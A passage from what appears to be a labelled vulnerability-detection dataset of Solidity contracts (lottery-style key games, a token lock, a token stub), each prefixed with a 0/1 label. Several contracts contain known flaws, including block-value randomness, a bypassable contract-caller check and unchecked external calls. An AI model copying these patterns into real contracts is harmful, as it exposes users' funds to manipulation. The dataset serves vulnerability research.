players[revealId].win = players[revealId].win.add(toRevealer);            uint256 toOwner = money.mul(wd) / 1000;      players[0].win = players[0].win.add(toOwner);            uint256 split = money.sub(_round.pool).sub(toWinner).sub(toRevealer).sub(toOwner);            if (lastOne.keys != 0) {          lastOne.mask = lastOne.mask.add(split / lastOne.keys);                     players[0].wallet = players[0].wallet.add(split.sub((split/lastOne.keys) * lastOne.keys));      } else {                                _round.pool = split.add(_round.pool);      }  }    function price(uint256 key) public view returns (uint256) {      return a.mul(key).add(b);  }    function ethForKey(uint256 _keys) public view returns (uint256) {      Round memory current = rounds[currentRound];      uint256 c_key = (current.keys / decimals);                   if (c_key.mul(decimals) != current.keys) {          c_key = c_key.add(1);      }            uint256 _price = price(c_key);      uint256 remainKeys = c_key.mul(decimals).sub(current.keys);      if (remainKeys >= _keys) {          return _price.mul(_keys) / decimals;      }             uint256 costEth = _price.mul(_keys) / decimals;      _keys = _keys.sub(remainKeys);            while(_keys >= decimals) {          c_key = c_key.add(1);          _price = price(c_key);          costEth = costEth.add(_price);          _keys = _keys.sub(decimals);      }          c_key = c_key.add(1);      _price = price(c_key);      costEth = costEth.add(_price.mul(_keys) / decimals);      return costEth;  }     function keys(uint256 _eth) public view returns (uint256) {      Round memory current = rounds[currentRound];            uint256 c_key = (current.keys / decimals).add(1);      uint256 _price = price(c_key);      uint256 remainKeys = c_key.mul(decimals).sub(current.keys);      uint256 remain =remainKeys.mul(_price) / decimals;            if (remain >= _eth) {          return _eth.mul(decimals) / _price;      }      uint256 boughtKeys = remainKeys;      _eth = _eth.sub(remain);      while(true) {          c_key = c_key.add(1);          _price = price(c_key);          if (_price <= _eth) {                             boughtKeys = boughtKeys.add(decimals);              _eth = _eth.sub(_price);          } else {              boughtKeys = boughtKeys.add(_eth.mul(decimals) / _price);              break;          }      }      return boughtKeys;  }       function core(uint256 _round, uint256 _pID, uint256 _eth) internal {      Round memory current = rounds[currentRound];             if (playerRoundData[_pID][_round].keys == 0) {          updatePlayer(_pID);      }            if (block.timestamp > current.endTime) {                     finalize(players[_pID].referer);                               updatePlayer(_pID);      }                   Round storage current_now = rounds[currentRound];                   uint256 _keys = keys(_eth);            if (_keys <= 0) {                                players[_pID].wallet = _eth.add(players[_pID].wallet);          return;      }      if (_keys >= decimals) {                     current_now.winner = players[_pID].addr;          current_now.endTime = current_now.endTime.add(timeGap);          if (current_now.endTime.sub(block.timestamp) > maxTimeRemain) {              current_now.endTime = block.timestamp.add(maxTimeRemain);          }      }                   uint256 toOwner = _eth.sub(_eth.mul(ta) / 1000);      toOwner = toOwner.sub(_eth.mul(tb) / 1000);      toOwner = toOwner.sub(_eth.mul(tc) / 1000);      toOwner = toOwner.sub(_eth.mul(td) / 1000);                   current_now.pool = (_eth.mul(ta) / 1000).add(current_now.pool);            if (current_now.keys == 0) {                     toOwner = toOwner.add((_eth.mul(tb) / 1000));          players[0].wallet = toOwner.add(players[0].wallet);      } else {          current_now.mask = current_now.mask.add((_eth.mul(tb) / 1000) / current_now.keys);                                uint256 dust = (_eth.mul(tb) / 1000).sub( _eth.mul(tb) / 1000 / current_now.keys * current_now.keys );          players[0].wallet = toOwner.add(dust).add(players[0].wallet);      }             playerRoundData[_pID][currentRound].keys = _keys.add(playerRoundData[_pID][currentRound].keys);      current_now.keys = _keys.add(current_now.keys);      current_now.eth = _eth.add(current_now.eth);             playerRoundData[_pID][currentRound].mask = current_now.mask.mul(_keys).add(playerRoundData[_pID][currentRound].mask);                   uint256 referer1 = players[_pID].referer;      uint256 referer2 = players[referer1].referer;      players[referer1].affiliate = (_eth.mul(tc) / 1000).add(players[referer1].affiliate);      players[referer2].affiliate = (_eth.mul(td) / 1000).add(players[referer2].affiliate);  }          function BuyKeys(uint256 ref) payable whenNotPaused public {      registerUserIfNeeded(ref);      core(currentRound, playerIds[msg.sender], msg.value);  }  function ReloadKeys(uint256 value, uint256 ref) whenNotPaused public {      registerUserIfNeeded(ref);      players[playerIds[msg.sender]].wallet = retrieveEarnings().sub(value);      core(currentRound, playerIds[msg.sender], value);  }    function retrieveEarnings() internal returns (uint256) {      uint256 id = playerIds[msg.sender];      updatePlayer(id);      PlayerStatus storage player = players[id];            uint256 earnings = player.wallet.add(player.affiliate).add(player.win);            if (earnings == 0) {          return;      }            player.wallet = 0;      player.affiliate = 0;      player.win = 0;      return earnings;  }       function withdrawal(uint256 ref) whenNotPaused public {      registerUserIfNeeded(ref);            uint256 earnings = retrieveEarnings();      if (earnings == 0) {          return;      }      msg.sender.transfer(earnings);  }  function playerCount() public view returns (uint256) {      return players.length;  }    function register(uint256 ref) public whenNotPaused {    registerUserIfNeeded(ref);  }    function remainTime() public view returns (uint256) {      if (rounds[currentRound].endTime <= block.timestamp) {          return 0;      } else {          return rounds[currentRound].endTime - block.timestamp;      }  }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }}
1<CODESPLIT>contract DVPlock is Ownable{  using SafeERC20 for ERC20;  using SafeMath for uint256;  ERC20 public token;  address public sponsor;  mapping (address => uint256) public balances;  mapping (address => uint256) public withdrawAmounts;  uint256 public tokenTotal;  uint256 public releaseTime;  constructor() public{    releaseTime = 0;    tokenTotal = 0;    sponsor = msg.sender;      }  function setToken(ERC20 _token) onlyOwner public{         if(token!=address(0)){      revert();    }    token = _token;  }  function setReleaseTime(uint256 _releaseTime) onlyOwner public{      require(releaseTime==0);      releaseTime = _releaseTime;      require(addSponsor(sponsor));  }     function addSponsor(address _sponsor) internal returns(bool result){      uint256 _amount =token.totalSupply()/5;      return addInvestor(_sponsor,_amount);  }  function addInvestor(address investor,uint256 amount) onlyOwner public returns(bool result){      if(releaseTime!=0){          require(block.timestamp < releaseTime);      }      require(tokenTotal == token.balanceOf(this));      balances[investor] = balances[investor].add(amount);      tokenTotal = tokenTotal.add(amount);      if(tokenTotal>token.balanceOf(this)){          token.safeTransferFrom(msg.sender,this,amount);      }      return true;  }      function release() public {    require(releaseTime!=0);    require(block.timestamp >= releaseTime);    require(balances[msg.sender] > 0);         uint256 released_times = (block.timestamp-releaseTime).div(60*60*24*30*3);     uint256 _amount = 0;    uint256 lock_quarter = 0;        if(msg.sender!=sponsor){                 lock_quarter = 6 ;    }else{                  lock_quarter = 12;    }        if(withdrawAmounts[msg.sender]==0){        withdrawAmounts[msg.sender]= balances[msg.sender].div(lock_quarter);    }        if(released_times>=lock_quarter){        _amount = balances[msg.sender];    }else{        _amount = balances[msg.sender].sub(withdrawAmounts[msg.sender].mul(lock_quarter.sub(released_times+1)));    }    balances[msg.sender] = balances[msg.sender].sub(_amount);    tokenTotal = tokenTotal.sub(_amount);    token.safeTransfer(msg.sender, _amount);  }}
1<CODESPLIT>contract PrimasToken{    bool  public transfersEnabled = true;    mapping (address => uint) jail;    function transferFrom(address _from, address _to, uint256 _value) returns (bool) {        if (!transfersEnabled) revert();        if (jail[msg.sender] >= block.timestamp || jail[_to] >= block.timestamp || jail[_from] >= block.timestamp ) revert();        else return true;    }}
0<CODESPLIT>contract PoHMO4D is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x1d7D82B8202CF554b6378759d2e46E9e18494E6a);    address private admin = msg.sender;    string constant public name = "PoHMO4D";    string constant public symbol = "POH4D";    uint256 private rndExtra_ = 1 minutes;          uint256 private rndGap_ = 1 minutes;              uint256 constant private rndInit_ = 12 hours;                     uint256 constant private rndInc_ = 2 minutes;                   uint256 constant private rndMax_ = 12 hours;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(60,0);            fees_[1] = F3Ddatasets.TeamFee(60,0);          fees_[2] = F3Ddatasets.TeamFee(60,0);         fees_[3] = F3Ddatasets.TeamFee(60,0);                             potSplit_[0] = F3Ddatasets.PotSplit(15,0);           potSplit_[1] = F3Ddatasets.PotSplit(10,0);            potSplit_[2] = F3Ddatasets.PotSplit(5,0);           potSplit_[3] = F3Ddatasets.PotSplit(7,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 1590000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 admin.transfer(_com);        admin.transfer(_p3d.sub(_p3d / 2));        round_[_rID].pot = _pot.add(_p3d / 2);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;        uint256 _com = _eth / 50;        _com = _com.add(_p1);        uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                 _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         uint256 _potAmount = _p3d / 2;            admin.transfer(_p3d.sub(_potAmount));            round_[_rID].pot = round_[_rID].pot.add(_potAmount);                         